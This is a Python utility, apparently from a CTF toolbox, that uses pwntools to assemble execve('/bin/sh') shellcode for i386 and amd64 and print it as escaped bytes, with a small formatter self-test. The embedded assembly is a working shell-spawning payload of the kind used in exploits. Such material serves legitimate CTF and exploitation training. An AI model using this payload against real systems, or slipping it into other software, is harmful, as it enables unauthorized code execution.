# -*- coding: utf-8 -*-
"""shellcode_generator 直接汇编生成 shellcode

来源: https://github.com/SourceLizi/ctf-toolbox (完善: 修复 \\xNN 输出未补零、参数化架构)
依赖: pip install pwntools   (需要 binutils 汇编器, Windows 建议在 WSL 使用)

用法:
    python shellcode_generator.py                 # 默认 i386 execve("/bin/sh")
    python shellcode_generator.py --arch amd64    # 64 位
    python shellcode_generator.py --test          # 自测格式化输出
    修改 asm_code 变量即可换成自己的汇编。
"""
import argparse
import sys

I386_EXECVE_SH = (
    "xor eax, eax; "
    "push 0x0068732f; "     # "/sh\x00"
    "push 0x6e69622f; "     # "/bin"
    "mov ebx, esp; "
    "push eax; "
    "push ebx; "
    "mov ecx, esp; "
    "xor edx, edx; "
    "mov al, 0xb; "
    "int 0x80; "
)

AMD64_EXECVE_SH = (
    "xor rsi, rsi; "
    "xor rdx, rdx; "
    "push rdx; "
    "mov rax, 0x68732f6e69622f; "
    "push rax; "
    "mov rdi, rsp; "
    "mov al, 59; "
    "syscall; "
)


def str_to_hex(shellcode: bytes) -> str:
    """bytes -> \\xNN 形式(两位补零, 原版实现会漏前导零)。"""
    return ''.join('\\x%02x' % c for c in shellcode)


def main():
    ap = argparse.ArgumentParser(description='shellcode 生成')
    ap.add_argument('--arch', choices=['i386', 'amd64'], default='i386')
    ap.add_argument('--test', action='store_true', help='自测 str_to_hex')
    args = ap.parse_args()

    if args.test:
        cases = {
            b'\x0b\x00\xff': '\\x0b\\x00\\xff',
            b'AB': '\\x41\\x42',
        }
        ok = True
        for raw, expect in cases.items():
            got = str_to_hex(raw)
            good = got == expect
            ok &= good
            print(f"[{'OK' if good else 'FAIL'}] {raw!r} -> {got}")
        sys.exit(0 if ok else 1)

    try:
        from pwn import asm, context
    except ImportError:
        print('缺少依赖: pip install pwntools')
        sys.exit(2)

    context(os='linux', arch=args.arch)
    asm_code = I386_EXECVE_SH if args.arch == 'i386' else AMD64_EXECVE_SH
    shellcode = asm(asm_code)
    print("shellcode generated, len:%d" % len(shellcode))
    print(str_to_hex(shellcode))


if __name__ == '__main__':
    main()
